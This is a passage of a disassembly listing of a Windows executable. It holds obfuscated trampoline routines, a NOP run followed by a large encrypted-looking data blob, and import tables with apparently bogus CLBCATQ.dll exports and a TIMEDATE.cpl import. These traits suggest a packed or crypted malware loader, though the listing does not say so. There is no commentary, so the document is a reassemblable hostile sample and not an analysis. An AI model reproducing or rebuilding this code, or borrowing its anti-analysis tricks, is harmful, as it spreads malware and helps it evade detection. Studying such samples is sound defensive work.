sub_411F90	proc near		; CODE XREF: sub_411F6A+1Ap
		pop	ecx
		call	ecx
		add	esp, 4Ch
		pop	ebp
		retn	0
sub_411F90	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_411F9C	proc near		; CODE XREF: sub_411708+15p
		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 2Ch
		mov	eax, offset dword_4D23A4
		sub	dword ptr [eax-40h], 55h
		push	eax
		push	edx
		push	dword ptr [eax+254h]
		call	sub_411630
		add	esp, 8
		pop	eax
		push	eax
		push	0
		call	sub_411FCD
		mov	eax, ds:lstrlenA
		jmp	eax
sub_411F9C	endp


; =============== S U B	R O U T	I N E =======================================


sub_411FCD	proc near		; CODE XREF: sub_411F9C+25p
		pop	ecx
		call	ecx
		pop	eax
		push	eax
		mov	edi, 0
		push	edi
		call	sub_411FE4
		mov	eax, ds:FindClose
		jmp	eax
sub_411FCD	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_411FE4	proc near		; CODE XREF: sub_411FCD+Bp
		pop	ecx
		call	ecx
		pop	eax
		add	esp, 2Ch
		pop	ebp
		retn	0
sub_411FE4	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 0C1h	dup(90h)
		dd 5BB24FECh, 69395408h, 73F422F8h, 2218B5ECh, 0C45BCCAEh
		dd 9ECBBC4Eh, 86C22864h, 0BC7E1C42h, 3548D38Dh,	0D7A579Ch
		dd 9D58400Fh, 0B73A17E2h
		db 0B5h, 3Fh
word_4120E2	dw 8650h		; DATA XREF: sub_4112E4+17o
		dd 45FC0EF8h, 237E077Ch, 1C695AC9h, 471FF421h, 0F60C3B93h
		dd 78FBFF97h, 0B1950B0Fh, 584A8587h, 0C9CC53F9h, 4A541A90h
		dd 2546612Ch, 12A260CEh, 8C301AACh, 1E93DBA9h, 0E75AED7h
		dd 73A8713h, 0A86B438Dh, 5430532Eh, 5F937497h, 2F49AAF2h
		dd 65CC7879h, 0BB663C3Eh, 28D1E259h, 55009246h,	0C26F254Fh
		dd 9156F7EFh, 9DD428A3h, 0A46C9D59h, 207026ACh,	0D8507633h
		dd 38585A7Ch, 9479D26Dh, 4938AFBFh, 0E4764F1Bh,	0F22B27E5h
		dd 7FB1FBF2h, 0BF32FDF9h, 54092B03h, 0AA9B9079h, 0D81DC83Ch
		dd 13F734ABh, 0FDF23AAh, 239C91D5h, 94C7A029h, 143ED014h
		dd 0DC3B5C8Dh, 6E1957AEh, 0B23B43D7h, 2196A1EBh, 9021509Fh
		dd 1F74DDB0h, 4123B27h,	26375DEh, 0B5CEE2BBh, 8C362179h
		dd 0EA4EEFEBh, 0A0D820ADh, 5345F84Eh, 0EFA9FC27h, 0F150732Fh
		dd 0EE68CEF1h, 61414778h, 0C414FB85h, 0D652F6D3h, 0EB417F03h
		dd 0A20BFB1h, 0FA430FA8h, 80AA9781h, 2A011BACh,	0EA53DAD2h
		dd 1F7DE13Ch, 596DA79Ch, 57BD1C45h, 54002AD1h, 2158193Dh
		dd 2C650F50h, 1D2AFE25h, 391A5F45h, 640E3BE3h, 344EAAFEh
		dd 8E60DE1Fh, 644AF8Ah,	862A104Eh, 2B2F7CE7h, 1517BAE2h
		dd 4D8015FAh, 0A435E2D9h, 2519F16Ch, 27B07A2h, 231FC5Ah
		dd 8A48A5D6h, 9474003Fh, 20685148h, 0EF6379A0h,	0C468B085h
		dd 0C8C70F82h, 97A80C9Eh, 0C701F9EBh, 24839DADh, 0FAF02CFEh
		dd 7D781774h, 3E3C8A52h, 9F761D29h, 0B03B0ED4h,	534BEF1Fh
		dd 0C1D57C74h, 606ABA30h, 0A27Ch, 5800513Eh, 0A70C6814h
		dd 0B3F384Ah, 0E1BE83Dh, 8CFA1F1Eh, 8F7E2B83h, 0EF4E9EFDh
		dd 8FAEB87Dh, 5B27D526h, 0BB521DF5h, 515C2EFAh,	0A836B619h
		dd 14905B0Ch, 230A4B6h,	0E90C07A4h, 740601A4h, 335BC98Fh
		dd 0F831C0B3h, 0F8250809h, 0FD4A8404h, 7C251A7Ah, 0B1678D3Dh
		dd 1F17C215h, 0F0BC50Eh, 0F3FAE287h, 0CA2D7567h, 6E767973h
		dd 0B4D3F4Ah, 5A6292Eh,	74D61497h, 4968793Fh, 0A1384214h
		dd 0D37655F5h, 0BCC47D01h, 2BA2BB84h, 40AE0AC6h, 2B015563h
		dd 6603BAC7h, 0B6AC23E8h, 70AD6434h, 0E69839EDh, 99184CA7h
		dd 335B7757h, 927BB7FEh, 59FD5EF9h, 3C3824ECh, 0C91F26FBh
		dd 10CF16D0h, 88672273h, 0C0461139h, 0E2204C11h, 0EEFD92Dh
		dd 0F388BCE9h, 2CBB4A50h, 0F6B60E20h, 0A203594Fh, 8650FCF3h
		dd 1B242B86h, 0E606D340h, 93C0082Fh, 0BBEBD79Ch, 0F6499DCDh
		dd 0A9A1FAB0h, 0D4C57957h, 64E9BCABh, 0B274DEF1h, 0D99AD9F3h
		dd 1AC86CF9h, 8DE5B273h, 3571D939h, 99C06731h, 8EB6363h
		dd 0D427E0E1h, 6A7BF41Ah, 0E23DFA1Dh, 0A11A158Dh, 50650EACh
		dd 7F328746h, 3F3D4722h, 601EA381h, 0E5F05D95h,	0DF2174C6h
		dd 0E4417248h, 0F1C968ECh, 3857B09Fh, 354D7529h, 12528A94h
		dd 8926BA6Fh, 0C3075C37h, 6C5A40F9h, 67290438h,	3EBD24Eh
		dd 8165E94Fh, 28B1A3A7h, 0A4A781D7h, 0D243C083h, 0EDA0B741h
		dd 76405B84h, 3775D2C2h, 4136BC9Eh, 0A5430616h,	33A0F6C2h
		dd 1EBB1BA2h, 82A06F7Ch, 0CA93348Ah, 5CBA11ADh,	2E5D08C6h
		dd 68D16F8Bh, 34770E3Ah, 7BD3871Dh, 0EB963C71h,	0F54B1981h
		dd 85F364C0h, 12F24D9Fh, 0B05D1244h, 0D82E892Bh, 13E8837Dh
		dd 28ACA41h, 0FEFB8DEAh, 0BF4E390Ah, 0D8EFDDD5h, 0E153EA2Bh
		dd 0DC0DF114h, 9F73380Eh, 0F4CE175Fh, 30647F6Ah, 2CB9E2C0h
		dd 16564844h, 9EC32422h, 409E6DEEh, 7E193A40h, 0BF042471h
		dd 0DAEA1238h, 0B48AF6E3h, 25BA0499h, 0B6298BB3h, 8AD7A4C5h
		dd 7C763AA3h, 0BE3B1D71h, 0E62DFAF0h, 7316FD7Ah, 230AF5h
		dd 11855Ah, 3928B6E5h, 1C145B76h, 371259F3h, 9B092CB9h
		dd 0F414E214h, 7A0A710Eh, 40D4CCFh, 8206A627h, 4A03275Bh
		dd 45C2CA6Ch, 231130BDh, 54E209ACh, 423C8FAEh, 5C9DB95Ch
		dd 2D3ADCF6h, 9D451B7Ah, 8EA7EDF8h, 1DAE388h, 4D723F8h
		dd 0EA6B91FCh, 0F535C95Bh, 0F9EAE7F7h, 0C7BD5803h, 6E2BF474h
		dd 0B4498F39h, 970F9BE1h, 3FCE48ACh, 0AC37895Dh, 0D5B09E6Ch
		dd 9BA4CDFh, 873DE50Eh,	371EBEFAh, 9B00B76Fh, 0B08B5BB7h
		dd 0ACBA288Fh, 75B5BF41h, 5B5ADFA0h, 0F8D20F13h, 77B18CB5h
		dd 0FED38A2Fh, 97399547h, 0CB10CAA3h, 255D9A02h, 0EAA59D58h
		dd 0CDBA6A5Fh, 0AE5D352Fh, 770ADE1Eh, 37889784h, 9B444F7Fh
		dd 0D58343BFh, 6141A1DFh, 0D871FC9Fh, 0EC34FE4Fh, 364F8074h
		dd 149FCCB7h, 0C5C4B65Ah, 0C791A3A6h, 0E35070B7h, 0B1A7385Bh
		dd 0B890FD01h, 0DE689201h, 4B5C4900h, 162E2482h, 0E11778B7h
		dd 0EC5E4353h, 257BF922h, 9909A96Eh, 0CF18F0F3h, 67874439h
		dd 3343A2DCh, 985511EBh, 3379DCB3h, 0D9B9D60Ch,	130F0E73h
		dd 0CD869F6Ch, 66434D92h, 2F05D240h, 0FF622A41h, 7F31794Ch
		dd 116CCECEh, 0FB5B0F03h, 279E4F7h, 0C1B9F62Eh,	9F08F362h
		dd 8F8179E4h, 472AF186h, 0D77B11ABh, 9C5BE0B3h,	9E798229h
		dd 4C3494EBh, 569146B1h, 6B22F708h, 0CA477CEEh,	357BB222h
		dd 9D578945h, 4E0D2CF4h, 1B8D967Ah, 9F814A19h, 2540A50Ch
		dd 36D30B81h, 30AF0E87h, 0A8AEF9CEh, 7F0FD68Fh,	40AD28F7h
		dd 0A30E982Eh, 126640D3h, 0DCE3DF31h, 6E717170h, 72B5E5B8h
		dd 3D9A71ACh, 8E697C5Fh, 4734BE72h, 0A31A5F39h,	510D2FF4h
		dd 1B6054FAh, 0C08A4C8Bh, 86E8401Fh, 4B00F03Ch,	0B502969Fh
		dd 37EA4B4Fh, 9F8B7B2Ah, 0C4B4C86Ah, 583C5E43h,	98936A71h
		dd 2AE4D326h, 0F507B9A0h, 33308D13h, 61DA6DC8h,	0DB6F42E0h
		dd 0EEF79287h, 0AE872B81h, 0BF3E1E03h, 0DF770B6Bh, 0B83B85A5h
		dd 9E2C2B8h, 8581EA4Ch,	4241F1CAh, 0C9DC73E5h, 646E38F6h
		dd 67C84F2Ch, 5B644DB6h, 0AD32265Bh, 0D6731047h, 0EB518949h
		dd 22A8C4A4h, 107037ADh, 8391F12h, 0DC8C4C89h, 3ABDF6BBh
		dd 0A1D49AFFh, 6827007Bh, 0FCE4C92h, 8B47A0D0h,	37C2B220h
		dd 278142C9h, 0BDDBCDBAh, 0FDAD3241h, 938E0569h, 0B91519h
		dd 6C1A0F26h, 35052E09h, 7CBB300Fh, 0A21D9911h,	99B54789h
		dd 0F3D76426h, 6A69944Fh, 35347D18h, 1A1A3E8Ch,	0D0D1F46h
		dd 86068FA3h, 0C30347D1h, 6101A3E8h, 3000D1F4h,	40068FAh
		dd 0DA00347Dh, 0E9001A3Bh, 0B64F0D1Dh, 1D27EA9Dh, 0A09E297Fh
		dd 0AC4FD8D6h, 90EFF92Dh, 17h dup(0)
		dd 200h	dup(?)
_text		ends

; Section 2. (virtual address 00003000)
; Virtual size			: 000BF000 ( 782336.)
; Section size in file		: 00000600 (   1536.)
; Offset to raw	data for section: 00058C00
; Flags	C0000040: Data Readable	Writable
; Alignment	: default
;
; Imports from KERNEL32.dll
;
; ===========================================================================

; Segment type:	Externs
; _idata
; HANDLE __stdcall CreateFileW(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD	dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile)
		extrn CreateFileW:dword	; DATA XREF: .rdata:004130BCo
; BOOL __stdcall UnmapViewOfFile(LPCVOID lpBaseAddress)
		extrn UnmapViewOfFile:dword ; DATA XREF: sub_4112E4+5Er
					; sub_411762+2Br ...
; int __stdcall	lstrlenA(LPCSTR	lpString)
		extrn lstrlenA:dword	; DATA XREF: sub_411498+1Cr starto ...
; HLOCAL __stdcall LocalFree(HLOCAL hMem)
		extrn LocalFree:dword	; DATA XREF: sub_41110C+2Cr
					; sub_411D6C+20r
; HANDLE __stdcall HeapCreate(DWORD flOptions, SIZE_T dwInitialSize, SIZE_T dwMaximumSize)
		extrn HeapCreate:dword
; LPSTR	__stdcall lstrcatA(LPSTR lpString1, LPCSTR lpString2)
		extrn lstrcatA:dword	; CODE XREF: start+Cp
					; DATA XREF: start+Cr
; BOOL __stdcall GetComputerNameA(LPSTR	lpBuffer, LPDWORD nSize)
		extrn GetComputerNameA:dword
; void __stdcall GetSystemTime(LPSYSTEMTIME lpSystemTime)
		extrn GetSystemTime:dword
; HMODULE __stdcall GetModuleHandleA(LPCSTR lpModuleName)
		extrn GetModuleHandleA:dword ; DATA XREF: sub_41113F+3o
					; sub_4116E4+1Dr ...
; BOOL __stdcall ResetEvent(HANDLE hEvent)
		extrn ResetEvent:dword
; BOOL __stdcall GlobalUnlock(HGLOBAL hMem)
		extrn GlobalUnlock:dword ; DATA	XREF: sub_411023+1Dr
					; sub_4110B4+1Dr ...
; DWORD	__stdcall GetTickCount()
		extrn GetTickCount:dword ; DATA	XREF: sub_41151C+33r
					; sub_411556+8r ...
; void __stdcall Sleep(DWORD dwMilliseconds)
		extrn Sleep:dword	; DATA XREF: sub_411000+1Cr
					; sub_4111BE+Er
; BOOL __stdcall FindClose(HANDLE hFindFile)
		extrn FindClose:dword	; DATA XREF: sub_411188+2Fr
					; sub_4114BB+20r ...
; LPWSTR __stdcall GetCommandLineW()
		extrn GetCommandLineW:dword ; DATA XREF: sub_411908+8r
					; sub_411BAC+2Er
; DWORD	__stdcall GetCurrentDirectoryA(DWORD nBufferLength, LPSTR lpBuffer)
		extrn GetCurrentDirectoryA:dword
; HANDLE __stdcall CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags,	LPDWORD	lpThreadId)
		extrn CreateThread:dword
; BOOL __stdcall CloseHandle(HANDLE hObject)
		extrn CloseHandle:dword	; DATA XREF: sub_411881+Cr
					; sub_411B4C+1Dr ...
; BOOL __stdcall PulseEvent(HANDLE hEvent)
		extrn PulseEvent:dword	; DATA XREF: sub_411630+2Ar
					; sub_411A14+31r ...
; HMODULE __stdcall LoadLibraryW(LPCWSTR lpLibFileName)
		extrn LoadLibraryW:dword ; CODE	XREF: start+25p
					; DATA XREF: sub_4112A0+31o ...

;
; Imports from USER32.dll
;
; HWND __stdcall GetDlgItem(HWND hDlg, int nIDDlgItem)
		extrn GetDlgItem:dword	; DATA XREF: .rdata:004130D0o
; BOOL __stdcall CheckRadioButton(HWND hDlg, int nIDFirstButton, int nIDLastButton, int	nIDCheckButton)
		extrn CheckRadioButton:dword
; BOOL __stdcall DrawEdge(HDC hdc, LPRECT qrc, UINT edge, UINT grfFlags)
		extrn DrawEdge:dword
; int __stdcall	FillRect(HDC hDC, const	RECT *lprc, HBRUSH hbr)
		extrn FillRect:dword
; BOOL __stdcall DrawMenuBar(HWND hWnd)
		extrn DrawMenuBar:dword
; HWND __stdcall CreateWindowExA(DWORD dwExStyle, LPCSTR lpClassName, LPCSTR lpWindowName, DWORD dwStyle, int X, int Y,	int nWidth, int	nHeight, HWND hWndParent, HMENU	hMenu, HINSTANCE hInstance, LPVOID lpParam)
		extrn CreateWindowExA:dword
; SHORT	__stdcall GetKeyState(int nVirtKey)
		extrn GetKeyState:dword
; LRESULT __stdcall DispatchMessageA(const MSG *lpMsg)
		extrn DispatchMessageA:dword
; LRESULT __stdcall CallWindowProcA(WNDPROC lpPrevWndFunc, HWND	hWnd, UINT Msg,	WPARAM wParam, LPARAM lParam)
		extrn CallWindowProcA:dword
; HWND __stdcall SetFocus(HWND hWnd)
		extrn SetFocus:dword	; DATA XREF: sub_4110D8+1Fr
; BOOL __stdcall IsWindow(HWND hWnd)
		extrn IsWindow:dword	; DATA XREF: sub_411811+21r
					; sub_4118D0+31r ...
; HDC __stdcall	GetDC(HWND hWnd)
		extrn GetDC:dword	; DATA XREF: sub_4113B4+1Br
					; sub_411708+25r ...
; BOOL __stdcall GetScrollBarInfo(HWND hwnd, LONG idObject, PSCROLLBARINFO psbi)
		extrn GetScrollBarInfo:dword

;
; Imports from CLBCATQ.dll
;
		extrn SetSetupOpen:dword ; DATA	XREF: .rdata:004130E4o
		extrn SetupOpen:dword
		extrn UpdateFromAppChange:dword
		extrn CheckMemoryGates:dword
		extrn DowngradeAPL:dword

;
; Imports from TIMEDATE.cpl
;
		extrn CPlApplet:dword	; DATA XREF: .rdata:004130F8o


; ===========================================================================

; Segment type:	Pure data
; Segment permissions: Read/Write
_rdata		segment	para public 'DATA' use32
		assume cs:_rdata
		;org 4130ACh
__IMPORT_DESCRIPTOR_KERNEL32 dd	rva off_413110 ; Import	Name Table
		dd 0			; Time stamp
		dd 0			; Forwarder Chain
		dd rva aKernel32_dll	; DLL Name
		dd rva CreateFileW	; Import Address Table
__IMPORT_DESCRIPTOR_USER32 dd rva off_413164 ; Import Name Table
		dd 0			; Time stamp
		dd 0			; Forwarder Chain
		dd rva aUser32_dll	; DLL Name
		dd rva GetDlgItem	; Import Address Table
__IMPORT_DESCRIPTOR_CLBCATQ dd rva off_41319C ;	Import Name Table
		dd 0			; Time stamp
		dd 0			; Forwarder Chain
		dd rva aClbcatq_dll	; DLL Name
		dd rva SetSetupOpen	; Import Address Table
__IMPORT_DESCRIPTOR_TIMEDATE_cpl dd rva	off_4131B4 ; Import Name Table
		dd 0			; Time stamp
		dd 0			; Forwarder Chain
		dd rva aTimedate_cpl	; DLL Name
		dd rva CPlApplet	; Import Address Table
		dd 5 dup(0)
;
; Import names for KERNEL32.dll
;
off_413110	dd rva word_41326E	; DATA XREF: .rdata:__IMPORT_DESCRIPTOR_KERNEL32o
		dd rva word_41328C
		dd rva word_413228
		dd rva word_4132CE
		dd rva word_4131E6
		dd rva word_4132C2
		dd rva word_4132DA
		dd rva word_41327C
		dd rva word_41329E
		dd rva word_413252
		dd rva word_413218
		dd rva word_4131F4
		dd rva word_413204
		dd rva word_41320C
		dd rva word_4131D4
		dd rva word_4131BC
		dd rva word_4132B2
		dd rva word_413260
		dd rva word_413244
		dd rva word_413234
		dd 0
;
; Import names for USER32.dll
;
off_413164	dd rva word_41334E	; DATA XREF: .rdata:__IMPORT_DESCRIPTOR_USER32o
		dd rva word_413396
		dd rva word_413342
		dd rva word_41335C
		dd rva word_4132FC
		dd rva word_41331C
		dd rva word_413368
		dd rva word_41332E
		dd rva word_41330A
		dd rva word_413376
		dd rva word_4133B2
		dd rva word_4133AA
		dd rva word_413382
		dd 0
;
; Import names for CLBCATQ.dll
;
off_41319C	dd rva word_4133FC	; DATA XREF: .rdata:__IMPORT_DESCRIPTOR_CLBCATQo
		dd rva word_4133DA
		dd rva word_4133E6
		dd rva word_41340C
		dd rva word_4133CA
		dd 0
;
; Import names for TIMEDATE.cpl
;
off_4131B4	dd rva word_41342C	; DATA XREF: .rdata:__IMPORT_DESCRIPTOR_TIMEDATE_cplo
		dd 0
word_4131BC	dw 1C0h			; DATA XREF: .rdata:0041314Co
		db 'GetCurrentDirectoryA',0
		align 4
word_4131D4	dw 188h			; DATA XREF: .rdata:00413148o
		db 'GetCommandLineW',0
word_4131E6	dw 4F1h			; DATA XREF: .rdata:00413120o
		db 'HeapCreate',0
		align 4
word_4131F4	dw 1C7h			; DATA XREF: .rdata:0041313Co
		db 'GetTickCount',0
		align 4
word_413204	dw 4B3h			; DATA XREF: .rdata:00413140o
		db 'Sleep',0
word_41320C	dw 130h			; DATA XREF: .rdata:00413144o
		db 'FindClose',0
word_413218	dw 2C7h			; DATA XREF: .rdata:00413138o
		db 'GlobalUnlock',0
		align 4
word_413228	dw 54Eh			; DATA XREF: .rdata:00413118o
		db 'lstrlenA',0
		align 4
word_413234	dw 33Dh			; DATA XREF: .rdata:0041315Co
		db 'LoadLibraryW',0
		align 4
word_413244	dw 39Bh			; DATA XREF: .rdata:00413158o
		db 'PulseEvent',0
		align 2
word_413252	dw 410h			; DATA XREF: .rdata:00413134o
		db 'ResetEvent',0
		align 10h
word_413260	dw 54h			; DATA XREF: .rdata:00413154o
		db 'CloseHandle',0
word_41326E	dw 8Dh			; DATA XREF: .rdata:off_413110o
		db 'CreateFileW',0
word_41327C	dw 279h			; DATA XREF: .rdata:0041312Co
		db 'GetSystemTime',0
word_41328C	dw 4D7h			; DATA XREF: .rdata:00413114o
		db 'UnmapViewOfFile',0
word_41329E	dw 177h			; DATA XREF: .rdata:00413130o
		db 'GetModuleHandleA',0
		align 2
word_4132B2	dw 0B7h			; DATA XREF: .rdata:00413150o
		db 'CreateThread',0
		align 2
word_4132C2	dw 548h			; DATA XREF: .rdata:00413124o
		db 'lstrcatA',0
		align 2
word_4132CE	dw 349h			; DATA XREF: .rdata:0041311Co
		db 'LocalFree',0
word_4132DA	dw 18Eh			; DATA XREF: .rdata:00413128o
		db 'GetComputerNameA',0
		align 2
aKernel32_dll	db 'KERNEL32.dll',0     ; DATA XREF: .rdata:004130B8o
		align 4
word_4132FC	dw 6AEh			; DATA XREF: .rdata:00413174o
		db 'DrawMenuBar',0
word_41330A	dw 5FBh			; DATA XREF: .rdata:00413184o
		db 'CallWindowProcA',0
word_41331C	dw 652h			; DATA XREF: .rdata:00413178o
		db 'CreateWindowExA',0
word_41332E	dw 693h			; DATA XREF: .rdata:00413180o
		db 'DispatchMessageA',0
		align 2
word_413342	dw 6A8h			; DATA XREF: .rdata:0041316Co
		db 'DrawEdge',0
		align 2
word_41334E	dw 70Ch			; DATA XREF: .rdata:off_413164o
		db 'GetDlgItem',0
		align 4
word_41335C	dw 6DBh			; DATA XREF: .rdata:00413170o
		db 'FillRect',0
		align 4
word_413368	dw 722h			; DATA XREF: .rdata:0041317Co
		db 'GetKeyState',0
word_413376	dw 711h			; DATA XREF: .rdata:00413188o
		db 'SetFocus',0
		align 2
word_413382	dw 759h			; DATA XREF: .rdata:00413194o
		db 'GetScrollBarInfo',0
		align 2
word_413396	dw 626h			; DATA XREF: .rdata:00413168o
		db 'CheckRadioButton',0
		align 2
word_4133AA	dw 706h			; DATA XREF: .rdata:00413190o
		db 'GetDC',0
word_4133B2	dw 7C0h			; DATA XREF: .rdata:0041318Co
		db 'IsWindow',0
		align 2
aUser32_dll	db 'USER32.dll',0       ; DATA XREF: .rdata:004130CCo
		align 2
word_4133CA	dw 4			; DATA XREF: .rdata:004131ACo
		db 'DowngradeAPL',0
		align 2
word_4133DA	dw 1Fh			; DATA XREF: .rdata:004131A0o
		db 'SetupOpen',0
word_4133E6	dw 6			; DATA XREF: .rdata:004131A4o
		db 'UpdateFromAppChange',0
word_4133FC	dw 1Dh			; DATA XREF: .rdata:off_41319Co
		db 'SetSetupOpen',0
		align 4
word_41340C	dw 9			; DATA XREF: .rdata:004131A8o
		db 'CheckMemoryGates',0
		align 10h
aClbcatq_dll	db 'CLBCATQ.dll',0      ; DATA XREF: .rdata:004130E0o
word_41342C	dw 1			; DATA XREF: .rdata:off_4131B4o
		db 'CPlApplet',0
aTimedate_cpl	db 'TIMEDATE.cpl',0     ; DATA XREF: .rdata:004130F4o
		align 4
		dd 6Eh dup(0)
		dd 2FA80h dup(?)
_rdata		ends

; Section 3. (virtual address 000C2000)
; Virtual size			: 0000040A (   1034.)
; Section size in file		: 00000600 (   1536.)
; Offset to raw	data for section: 00059200
; Flags	C0000040: Data Readable	Writable
; Alignment	: default
; ===========================================================================

; Segment type:	Pure data
; Segment permissions: Read/Write
_data		segment	para public 'DATA' use32
		assume cs:_data
		;org 4D2000h
dword_4D2000	dd 15h dup(11111111h)	; DATA XREF: sub_4113B4+8o
dword_4D2054	dd 1Dh dup(11111111h)	; DATA XREF: sub_411844+8o
					; sub_411A68+8o
dword_4D20C8	dd 0Eh dup(11111111h)	; DATA XREF: sub_411740+8o
; const	WCHAR LibFileName
LibFileName	dw 6Dh
		dw 66h
a3216Dll:
		unicode	0, <3216*dll>,0
		align 4
		dd 0
dword_4D211C	dd 0Fh dup(0)		; DATA XREF: sub_411630+8o
dword_4D2158	dd 6 dup(0)		; DATA XREF: sub_411000+8o
dword_4D2170	dd 6 dup(0)		; DATA XREF: sub_41110C+8o
dword_4D2188	dd 8 dup(0)		; DATA XREF: sub_411BAC+8o
dword_4D21A8	dd 15h dup(0)		; DATA XREF: sub_4117EC+8o
dword_4D21FC	dd 14h dup(0)		; DATA XREF: sub_411CF0+8o
dword_4D224C	dd 10h dup(0)		; DATA XREF: sub_411924+8o
dword_4D228C	dd 1Bh dup(0)		; DATA XREF: sub_4112A0+Bo
dword_4D22F8	dd 15h dup(0)		; DATA XREF: sub_41151C+8o
dword_4D234C	dd 10h dup(0)		; DATA XREF: sub_411A14+8o
dword_4D238C	dd 6 dup(0)		; DATA XREF: sub_411F48+8o
dword_4D23A4	dd 97h dup(0)		; DATA XREF: sub_411F9C+8o
		align 1000h
_data		ends


		end start
